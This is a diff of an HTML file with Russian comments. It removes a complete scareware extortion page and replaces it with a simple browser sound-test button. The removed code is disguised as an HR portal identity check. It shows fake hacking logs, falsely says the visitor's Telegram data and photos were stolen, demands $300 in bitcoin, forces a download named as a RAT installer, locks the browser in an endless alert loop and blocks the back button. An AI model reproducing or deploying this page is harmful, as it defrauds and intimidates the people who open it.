@@ -1,184 +1,38 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>HR Portal | Security Verification</title>
-    <style>
-        body { background-color: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        
-        /* ТЕРМИНАЛЬНЫЙ ФОН: ПЛАВНЫЙ И ГЛУБОКИЙ */
-        #matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; font-size: 10px; opacity: 0.15; z-index: 1; pointer-events: none; white-space: pre; line-height: 1.2; overflow: hidden; }
-
-        /* НАЧАЛЬНЫЙ ЭКРАН (ПРИКРЫТИЕ) */
-        #overlay { position: fixed; top:0; left:0; width:100%; height:100%; z-index: 9999; background: #ffffff; display: flex; justify-content: center; align-items: center; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-        .start-box { background: white; padding: 40px; border-radius: 2px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); width: 90%; max-width: 420px; text-align: center; border-top: 5px solid #0052cc; }
-        .start-btn { padding: 16px; font-size: 15px; background: #0052cc; color: white; border: none; font-weight: 600; cursor: pointer; width: 100%; margin-top: 25px; border-radius: 3px; letter-spacing: 0.5px; }
-
-        /* ИНТЕРФЕЙС ШИФРОВАЛЬЩИКА (СТИЛЬ PETYA/WANNACRY) */
-        .content { position: relative; z-index: 10; width: 100%; height: 100%; display: none; background: #7b0000; color: white; padding: 40px; box-sizing: border-box; overflow-y: auto; }
-        .alert-box { max-width: 800px; margin: 0 auto; border: 2px solid white; padding: 30px; background: #000; box-shadow: 20px 20px 0px #4a0000; }
-        .btc-wallet { color: #ffff00; word-break: break-all; font-weight: bold; background: #222; padding: 15px; display: block; border: 1px dashed #ffff00; margin: 20px 0; font-size: 16px; text-align: center; font-family: monospace; }
-        
-        /* ЛОУДЕР В СТИЛЕ КОНСОЛИ */
-        #loader-screen { position: relative; z-index: 10; width: 80%; max-width: 500px; display: none; }
-        .progress-container { width: 100%; border: 1px solid #0f0; height: 10px; margin: 20px 0; background: #000; }
-        #progress-bar { width: 0%; height: 100%; background: #0f0; transition: width 0.4s ease-in-out; }
-        
-        .danger-btn { background: #ff0000; color: white; border: 2px solid white; padding: 20px; width: 100%; font-weight: 900; cursor: pointer; margin-top: 25px; text-transform: uppercase; font-size: 18px; }
-        .blink { animation: blinker 0.8s step-start infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
-        
-        h1 { font-size: 28px; margin-top: 0; color: #ff0000; text-transform: uppercase; border-bottom: 2px solid #ff0000; padding-bottom: 10px; }
-        .warning-text { color: #ff0000; font-weight: bold; background: white; padding: 5px; display: inline-block; margin-bottom: 15px; }
-    </style>
+    <title>Sound Test</title>
 </head>
-<body onclick="startAttack()">
+<body style="background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh;">
 
-    <div id="overlay">
-        <div class="start-box">
-            <h2 style="margin: 0 0 10px; color: #172b4d;">Identity Verification</h2>
-            <p style="color: #5e6c84; font-size: 14px; line-height: 1.5;">To protect our candidates, we require a mandatory system integrity check before displaying sensitive job offer details.</p>
-            <button class="start-btn">BEGIN SECURE SCAN</button>
-        </div>
-    </div>
-
-    <div id="matrix"></div>
-
-    <div id="loader-screen">
-        <div id="log-text" style="font-size: 12px; margin-bottom: 10px;">[INIT] Starting kernel-level diagnostic...</div>
-        <div class="progress-container"><div id="progress-bar"></div></div>
-        <div id="perc" style="font-size: 18px; font-weight: bold;">0% COMPLETED</div>
-        <div id="sub-log" style="font-size: 10px; color: #0a0; margin-top: 10px; height: 40px; overflow: hidden;"></div>
-    </div>
-
-    <div id="main-content" class="content">
-        <div class="alert-box">
-            <span class="warning-text">CRITICAL SYSTEM FAILURE</span>
-            <h1 class="blink">УСТРОЙСТВО ЗАБЛОКИРОВАНО</h1>
-            
-            <p>Все данные Telegram, история браузера и личные фото были успешно скопированы и отправлены на наш удаленный сервер <strong>82.202.160.11</strong>.</p>
-            <p><strong>RAT STATUS: ACTIVE (SESSION_ID: 0x882_AES)</strong></p>
-            
-            <p>Ваше устройство полностью скомпрометировано. Все личные переписки, видео и пароли от банковских приложений теперь находятся под нашим контролем.</p>
-            <p>Через 168 часов (7 дней) алгоритм <strong>AES-256</strong> применит окончательное шифрование ко всем файлам, и они будут опубликованы в открытом доступе.</p>
-            
-            <p style="color: #ff0000; font-weight: bold; border: 1px solid red; padding: 10px;">ВНИМАНИЕ: Любая попытка перезагрузки или закрытия страницы приведет к немедленному удалению ключа дешифровки и уничтожению файловой системы.</p>
-            
-            <div style="margin-top: 30px;">
-                <p style="margin: 0; font-size: 14px;">Для отмены публикации и получения ключа, оплатите <strong>$300</strong> на BTC-адрес:</p>
-                <span class="btc-wallet">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</span>
-            </div>
-            
-            <p class="blink" style="font-size: 20px; color: #ffff00; text-align: center; font-weight: bold; margin: 25px 0;">ОЖИДАНИЕ ТРАНЗАКЦИИ... (167:59:58)</p>
-            
-            <button class="danger-btn" onclick="scareMore()">ДЕАКТИВИРОВАТЬ И УДАЛИТЬ RAT</button>
-        </div>
-    </div>
-
-    <audio id="siren" loop src="https://www.soundjay.com/mechanical/sounds/siren-1.mp3"></audio>
+    <button id="testBtn" style="padding: 50px; font-size: 30px; cursor: pointer;">
+        НАЖМИ МЕНЯ (ПРОВЕРКА ЗВУКА)
+    </button>
 
     <script>
-        let prg = 0;
-        let isStarted = false;
-
-        const consoleLogs = [
-            "Scanning /data/user/0/com.telegram.messenger...",
-            "Hooking system calls: sys_read, sys_write...",
-            "Privilege escalation: UID 0 achieved.",
-            "Injecting payload into zygote process...",
-            "Dumping SQLite database: contacts.db",
-            "Accessing /DCIM/Camera/... 4.2GB identified.",
-            "Establishing tunnel to 82.202.160.11:443",
-            "Bypassing Play Protect integrity check...",
-            "RAT payload 0x882 deployed in memory-only mode.",
-            "Encrypting local buffer: RSA-2048 key generated.",
-            "Exfiltrating session tokens... [DONE]"
-        ];
-
-        function startAttack() {
-            if (isStarted) return;
-            isStarted = true;
-
-            document.getElementById('overlay').style.display = 'none';
-            document.getElementById('loader-screen').style.display = 'block';
-
-            // Официальная просьба (Notification)
-            if ("Notification" in window) {
-                Notification.requestPermission();
-            }
+        document.getElementById('testBtn').addEventListener('click', function() {
+            // Создаем аудио-движок
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
             
-            // Скачивание "ратника"
-            const a = document.createElement('a');
-            a.href = URL.createObjectURL(new Blob(["CRITICAL_SYSTEM_ERROR_LOG_882\nRAT_INSTALLED: TRUE"], {type: 'text/plain'}));
-            a.download = "RAT_v4.2_Payload_Installer.exe";
-            a.click();
+            // Создаем осциллятор (пищалку)
+            const oscillator = audioCtx.createOscillator();
+            const gainNode = audioCtx.createGain();
 
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen().catch(() => {});
-            }
+            oscillator.type = 'sine'; // Тип звука (чистый тон)
+            oscillator.frequency.setValueAtTime(440, audioCtx.currentTime); // Нота Ля
+            
+            gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime); // Громкость
 
-            slowLoading();
-            startMatrix();
-        }
+            oscillator.connect(gainNode);
+            gainNode.connect(audioCtx.destination);
 
-        function slowLoading() {
-            const bar = document.getElementById('progress-bar');
-            const perc = document.getElementById('perc');
-            const subLog = document.getElementById('sub-log');
-
-            const timer = setInterval(() => {
-                // Имитация "реальной" долгой работы (прыжки по 0.1 - 0.3%)
-                prg += Math.random() * 0.4;
-                if (prg > 100) prg = 100;
-                
-                bar.style.width = prg + "%";
-                perc.innerText = Math.floor(prg) + "% ANALYZING SYSTEM";
-
-                // Подстрочные логи для реализма
-                if (Math.random() > 0.8) {
-                    subLog.innerHTML = "> " + consoleLogs[Math.floor(Math.random() * consoleLogs.length)] + "<br>" + subLog.innerHTML;
-                }
-
-                if (prg >= 100) {
-                    clearInterval(timer);
-                    setTimeout(showRansom, 1500); // Небольшая пауза перед "ударом"
-                }
-            }, 100); 
-        }
-
-        function showRansom() {
-            document.getElementById('loader-screen').style.display = 'none';
-            document.getElementById('main-content').style.display = 'block';
-            document.body.style.backgroundColor = "#2a0000";
-            document.getElementById('siren').play().catch(() => {});
-            if(navigator.vibrate) navigator.vibrate([1000, 500, 1000]);
-        }
-
-        function startMatrix() {
-            const matrix = document.getElementById('matrix');
-            setInterval(() => {
-                const hex = "0123456789ABCDEF";
-                let line = "";
-                for(let i=0; i<50; i++) line += hex[Math.floor(Math.random()*16)] + " ";
-                matrix.innerText += "\n" + line;
-                if(matrix.innerText.length > 2000) matrix.innerText = matrix.innerText.substring(400);
-            }, 150);
-        }
-
-        function scareMore() {
-            // Алерты как на фото
-            alert("КРИТИЧЕСКАЯ ОШИБКА: Код доступа отклонен. RAT заблокировал попытку деактивации.");
-            alert("ATTEMPT TO CLOSE BLOCKED: Unauthorized core access.");
-            setTimeout(() => { 
-                while(true) { 
-                    alert("FATAL ERROR: DATA LOSS IN PROGRESS (SESSION_0x882)"); 
-                } 
-            }, 500);
-        }
-
-        history.pushState(null, null, location.href);
-        window.onpopstate = function () { history.go(1); };
+            oscillator.start();
+            
+            alert("Если ты не слышишь писк, значит звук заблокирован в браузере или в системе!");
+            
+            // Остановим через 2 секунды
+            setTimeout(() => { oscillator.stop(); }, 2000);
+        });
     </script>
 </body>
 </html>
